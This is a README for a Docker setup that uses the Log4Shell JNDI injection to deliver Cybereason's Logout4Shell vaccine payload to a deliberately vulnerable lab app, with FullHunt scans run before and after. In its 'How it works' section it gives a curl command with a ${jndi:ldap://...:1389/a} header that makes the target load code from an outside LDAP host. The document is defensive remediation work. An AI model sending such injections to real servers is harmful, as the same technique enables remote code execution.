# Logout4Shell Container

## Description

Since the disclosure of the Apache Log4j vulnerability affecting versions 2.0 through 2.14.1 in December of 2021, enterprises and small businesses have made it a priority to mitigate this risk. This vulnerability was given the highest possible severity rating of 10 when the CVE-2021-44228 was published on December 9, 2021 which allows remote code execution on vulnerable servers. 

With the guidance from the Apache software foundation, the best mitigation against this vulnerability is to patch log4j to 2.17.0 and above. In response to this 
vulnerability organizations like Cybereason and FullHunt have developed tools to scan for the vulnerability and mitigate this risk without the need to patch 
or restart the server.

Logout4Shell Container is not intended to take any credit for the research and development of these tools, but was developed for POC and ease of deployment.

More information regarding these tools can be found on [Cybereason Logout4Shell](https://github.com/Cybereason/Logout4Shell/blob/main/README.md) and 
[FullHunt log4j-scan](https://github.com/fullhunt/log4j-scan/blob/master/README.md)


## How Logout4Shell Container works

The Logout4Shell Container is multi-container application consisting of the Cybereason Logout4Shell webserver which hosts the Transient and Persistent payloads and the ldap server which enables communication to the webserver through the lookup. Once the Logout4shell container is deployed either locally or externally and inbound connections are whitelisted between the Logout4shell container and vulnerable server on ports 1389 and 8888, you can then SSH into the container and execute a curl command to the vulnerable server with an appropriate HTTP header. This command initiates the lookup to the ldap server which will then redirect to the webserver to deliver the payload.

## POC Test Environment

- Logout4Shell Container deployed via Docker on an Amazon Linux 2 AMI (HVM) - Kernel 5.10, 8 GB General Purpose SSD Volume Type, t2.micro, EC2 instance.
- FullHunt log4j scan deployed via Docker on an Amazon Linux 2 AMI (HVM) - Kernel 5.10, 8 GB General Purpose SSD Volume Type, t2.micro, EC2 instance.
- Vulnerable app deployed via Docker on an Amazon Linux 2 AMI (HVM) - Kernel 5.10, 8 GB General Purpose SSD Volume Type, t2.micro, EC2 instance. More information regarding this vulnerable app can be found on [Log4Shell sample vulnerable application]( https://github.com/christophetd/log4shell-vulnerable-app/blob/main/README.md).


## Test Environment Setup

### Logout4Shell Container

1. Launch an EC2 instance with the user data script below. This will run an OS update, install and start the Docker engine, ensure that the Docker daemon starts after each system reboot, and install git:
```
#!/bin/bash
yum update -y
amazon-linux-extras install -y docker
service docker start
system reboot
systemctl enable docker
yum install -y git
```
2. Install the latest version of Docker Compose:
```
sudo curl -L "https://github.com/docker/compose/releases/download/1.29.2/docker-compose-$(uname -s)-$(uname -m)" -o /usr/local/bin/docker-compose
```
3. Adjust permissions:
```
sudo chmod +x /usr/local/bin/docker-compose
```
4. Clone Logout4Shell Container repository:
```
git clone https://github.com/gbarretto/logout4shell-container.git
```
5. Change directory to logout4shell-container.
```
cd logout4shell-container
```
6. Open var.env in GNU nano to edit.
```
nano var.env
```
7. Replace ```<host_ip>``` with the public IP address of the EC2 instance making sure to keep quotation marks.  
8. Replace ```<mode_type>``` with Transient or Persistent making sure to keep quotation marks. 
9. Press ```Control + X``` to bring you to Save modified buffer question. Then press ```Y```. Then press ```Enter``` to write changes to var.env file.
10. Run the command below to add the ec2-user to the docker group so you can execute Docker commands without using sudo:
```
sudo usermod -a -G docker ec2-user
```
11. Log out of your SSH session using ```exit``` and log back in again to pick up the new docker group permissions. 
12. Change directory to logout4shell-container:
```
cd logout4shell-container
```
13. Build Docker images using the command below:
```
docker-compose build
```
- When images are successfully built you'll see:
```
Successfully built XXXXXXXXXXXX
Successfully tagged gbarretto/cybereason:ldap-persistent
```
14. Launch the container in detached mode:
```
docker-compose up -d
```
- When the containers is successfully launched you'll see:
```
Creating network "logout4shell-container_default" with the default driver
Creating webserver       ... done
Creating ldap-persistent ... done
```

### FullHunt log4j scan
1. Launch an EC2 instance with the same user data script from above.
2. SSH into your instance in a new terminal window and run the commands below to build the FullHunt log4j scan.
```
git clone https://github.com/fullhunt/log4j-scan.git
cd log4j-scan
sudo docker build -t log4j-scan .
```

### Vulnerable app
1. Launch an EC2 instance with the same user data script from above. Adjust the security group to allow inbound connection from the IP address of the Logout4Shell container on ports 1389, 8888 and 443 and from the IP address of the FullHunt log4j scan on port 443.
3. SSH into your instance in a new terminal window and run the command below to run the vulnerable app via Docker.
```
docker run --name vulnerable-app --rm -p 443:8080 ghcr.io/christophetd/log4shell-vulnerable-app
```
Also make sure this container isn't publicly accessible.

### Adjust Security Group for Logout4Shell Container
1. In the AWS Management Console adjust the security group for the Logout4Shell Container to allow inbound connection from the IP address of the Vulnerable App on ports 1389 and 8888.

## How it works
1. Let's first vaildate that the Vulernable app is indeed vulnerable. From the FullHunt log4j scan terminal window, execute the command below replacing ```<Vulnerable_App_IP_Address>``` with the IP address of the Vulmerable app instance.
```
sudo docker run -it --rm log4j-scan -u http://<Vulnerable_App_IP_Address>:443
```
- After a few seconds you should receive the following response:
```
[!!!] Target Affected
```
2. To vaccinate the Vulnerable app run the command below from the Logout4Shell Container terminal window replacing ```<Vulnerable_App_IP_Address>``` with the IP address of the Vulnerable app instance and ```<Logout4Shell_Container_IP_address>``` with the IP address of the Logout4Shell Container instance.
```
curl <Vulnerable_App_IP_Address>:443 -H 'X-Api-Version: ${jndi:ldap://<Logout4Shell_Container_IP_address>:1389/a}'
```
- After a few seconds you should receive a similar response in the Vulnerable app terminal window:
```
HelloWorld                               : Received a request for API version ${jndi:ldap://XX.XX.XXX.XXX:1389/a}
```
- If you scroll up in the same window you should receive the response below validating the Transient or Persistent payload was executed:
```
Setting FORMAT_MESSAGES_PATTERN_DISABLE_LOOKUPS value to True
````
3. Run the FullHunt log4j scan again and you should receive the output below validating the log4j vulnerability has been remediated.
```
[•] Targets do not seem to be vulnerable.
```
